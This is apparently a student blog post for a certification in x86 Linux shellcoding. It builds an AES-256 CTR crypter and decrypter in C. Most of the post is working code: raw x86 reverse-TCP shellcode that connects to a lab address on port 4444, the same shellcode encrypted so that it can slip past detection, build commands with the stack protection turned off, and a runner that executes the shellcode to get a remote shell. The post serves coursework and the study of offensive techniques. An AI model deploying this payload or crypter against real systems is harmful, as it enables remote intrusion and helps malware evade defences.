---
layout: post
title: SLAE32 Assignment7
---
![Alt](https://bohansec.com/assets/SHELLCODING32.png "Pentester Academy")

This blog post has been created for completing the requirments of the SecurityTube (Pentester Academy) x86 Assembly Language and Shellcoding on Linux certification:

[x86 Assembly Language and Shellcoding on Linux](https://www.pentesteracademy.com/course?id=3){:target="_blank"}

Student ID: SLAE-1562

### Objects
{% highlight js %}
Create a custom crypter like the one shown in the "crypters" video

Free to use any existing encryption schema

Can use any programming language

{% endhighlight %}

### Prerequisite

* Install libemu
{% highlight js %}
git clone https://github.com/buffer/libemu
sudo apt-get install autoconf
sudo apt-get install libtool
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
{% endhighlight %}

* Obtain the Kali (x86) Linux 2020.3 
{% highlight js %}
https://images.kali.org/virtual-images/kali-linux-2020.3-vmware-i386.7z
{% endhighlight %}

### Create the Crypter

For this assignment, I decided to use C and AES256 for my encryption schema. I used "Tiny-AES-C" to assist my encryption schema creation. You can find it at [here](https://github.com/kokke/tiny-AES-c){:target="_blank"}.

I chose CTR mode in AES 256. The portable library is easy to understand if you read the examples in the test.c file.

Encryption Code:

{% highlight js %}
#include<stdio.h>
#include<stdlib.h>
#include<string.h>


#define CBC 1
#define CTR 1
#define ECB 1
#define AES256 1

#include "aes.h"

int i;
static void encrypt(void)
{
    // IV: mykeyishardtosee
    uint8_t iv[]  = { 
			0x6d, 0x79, 0x6b, 0x65, 0x79, 0x69, 0x73, 0x68, 0x61, 0x72, 0x64, 0x74, 0x6f, 0x73, 0x65, 0x65 
		    };

    // Key: spcuyijbsdgwtigfedymyxzamskucbmr
    uint8_t key[] = { 
			0x73, 0x70, 0x63, 0x75, 0x79, 0x69, 0x6a, 0x62, 0x73, 0x64, 0x67, 0x77, 0x74, 0x69, 0x67, 0x66,
			0x65, 0x64, 0x79, 0x6d, 0x79, 0x78, 0x7a, 0x61, 0x6d, 0x73, 0x6b, 0x75, 0x63, 0x62, 0x6d, 0x72 
		    };

    //Shellcode Reverse TCP connect to my ip 192.168.200.136 at port 4444
    uint8_t shellcode[] = { 

			 	0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0x31,0xf6,0x31,0xff,0x66,0xb8,0x67,0x01,0xb3,0x02,0xb1,0x01,0xcd,0x80,0x89,0xc6,0x89,0xc3,0xb1,0x03,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf7,0x31,0xdb,0x89,0xf3,0x66,0xb8,0x6a,0x01,0x57,0x68,0xc0,0xa8,0xc8,0x88,0x66,0x68,0x11,0x5c,0x66,0x6a,0x02,0x89,0xe1,0xb2,0x66,0xcd,0x80,0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa
				
			  };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, shellcode, sizeof(shellcode));


    printf("Encrypted Shellcode Format 1:");
    printf("\n");

    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\x%02x", shellcode[i]);
    }

    printf("\n");

    printf("Encrypted Shellcode Format 2:");
    printf("\n");
	 
    for (i = 0; i < sizeof shellcode; i ++)
    {
	if(i == sizeof(shellcode)-1){
		printf("0x%02x", shellcode[i]);
	}else{
		printf("0x%02x,", shellcode[i]);
	}
    }
    
    printf("\n");
}

int main(void)
{
    encrypt();
}

{% endhighlight %}

{% highlight js %}
gcc -fno-stack-protector -z execstack Crypter.c aes.c -o Crypter
./Crypter
{% endhighlight %}

### Create the Deypter

The decryption part in the CTR mode is identical to the encryption except I used encrypted shellcode as the input shellcode.

Decryption Code:

{% highlight js %}
#include<stdio.h>
#include<stdlib.h>
#include<string.h>


#define CBC 1
#define CTR 1
#define ECB 1
#define AES256 1

#include "aes.h"

int i;
static void decrypt(void)
{
    // IV: mykeyishardtobreak
    uint8_t iv[]  = { 
			0x6d, 0x79, 0x6b, 0x65, 0x79, 0x69, 0x73, 0x68, 0x61, 0x72, 0x64, 0x74, 0x6f, 0x73, 0x65, 0x65 
		    };

    uint8_t key[] = { 
			0x73, 0x70, 0x63, 0x75, 0x79, 0x69, 0x6a, 0x62, 0x73, 0x64, 0x67, 0x77, 0x74, 0x69, 0x67, 0x66,
			0x65, 0x64, 0x79, 0x6d, 0x79, 0x78, 0x7a, 0x61, 0x6d, 0x73, 0x6b, 0x75, 0x63, 0x62, 0x6d, 0x72 
		    };

    //Shellcode Reverse TCP connect to my ip 192.168.200.136 at port 4444
    uint8_t shellcode[] = { 
				 0xf5,0xd0,0xb8,0xd4,0x53,0xb4,0x78,0x58,0x08,0xfa,0x7f,0x72,0x1d,0x17,0x5c,0x5c,0x16,0x94,0xcf,0x8a,0x01,0x3a,0xf3,0xd5,0xd9,0x58,0xe5,0x4a,0xe5,0xa5,0xa9,0x68,0xf0,0x8d,0x7f,0xbe,0xe5,0x3c,0x42,0xe7,0x7c,0x26,0x9e,0x8f,0xf2,0x03,0x42,0x8b,0xde,0xaa,0x0c,0xfb,0x63,0xe0,0x4a,0x88,0xa0,0x0c,0x8f,0xb9,0xe9,0x59,0x2c,0x86,0xa1,0xed,0xaa,0xb2,0xa2,0xed,0xa5,0xa8,0xed,0x26,0x2a,0xf6,0x20,0x15,0xd6,0xff,0x94,0x3f,0x5c,0x25,0x59,0x8d,0xff,0xda,0xf2,0x8f,0x6e,0xa0,0x6a,0xc3,0x63,0x98
			  };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, shellcode, sizeof(shellcode));


    printf("Decrypted Shellcode Format 1:");
    printf("\n");

    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\x%02x", shellcode[i]);
    }

    printf("\n");

    printf("Decrypted Shellcode Format 2:");
    printf("\n");
	 
    for (i = 0; i < sizeof shellcode; i ++)
    {
        if(i == sizeof(shellcode)-1)
	{
		printf("0x%02x", shellcode[i]);
	}else{
		printf("0x%02x,", shellcode[i]);
	}
    }

    printf("\n");
}

int main(void)
{
    decrypt();
}
{% endhighlight %}

Compile the code:
{% highlight js %}
gcc -fno-stack-protector -z execstack Decrypter.c aes.c -o Decrypter
./Decrypter
{% endhighlight %}

### Shellcode Test File

shellcode.c: 

{% highlight js %}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xdb\x89\xf3\x66\xb8\x6a\x01\x57\x68\xc0\xa8\xc8\x88\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x66\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xaa\xaa\xaa\xaa\xaa\xaa\xaa";
int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

{% endhighlight %}

{% highlight js %}
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode
{% endhighlight %}

Now once we run the decrypted shellcode, we get a reverse shell connected to my host machine.

![Reverse Shell](https://bohansec.com/assets/SLAE-assignment7/1.PNG "Reverse Shell")

You can find all the above code at [here](https://github.com/allan9595/SLAE-Assignments/tree/master/assignment7){:target="_blank"}.

Thanks for reading :)


